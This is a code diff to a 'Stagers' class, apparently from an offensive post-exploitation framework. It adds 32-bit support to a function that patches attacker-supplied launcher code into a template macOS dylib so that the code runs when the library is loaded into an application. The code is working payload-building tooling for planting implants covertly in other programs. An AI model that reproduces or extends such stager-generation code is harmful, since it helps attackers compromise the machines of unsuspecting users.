@@ -348,14 +348,17 @@ class Stagers:
             print helpers.color("[!] Unable to patch MachO binary")
 
 
-    def generate_dylib(self,launcherCode):
+    def generate_dylib(self,launcherCode,arch):
         """
         Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application. 
         """
         import macholib.MachO
 
         MH_DYLIB = 6
-        f = open(self.installPath + "/data/misc/templateDylib.dylib", "rb")
+        if arch == 'x86':
+            f = open(self.installPath + "/data/misc/template.dylib", "rb")
+        else:
+            f = open(self.installPath + "/data/misc/template64.dylib", "rb")
         macho = macholib.MachO.MachO(f.name)
 
         if int(macho.headers[0].header.filetype) != MH_DYLIB:
@@ -366,14 +369,14 @@ class Stagers:
 
         for cmd in cmds:
             count = 0
-            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
+            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
                 count += 1
                 if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
                     count += 1 
                     for section in cmd[count]:
                         if section.sectname.strip('\x00') == '__cstring':
                             offset = int(section.offset)
-                            placeHolderSz = int(section.size) - 13
+                            placeHolderSz = int(section.size) - 52
         template = f.read()
         f.close()
 
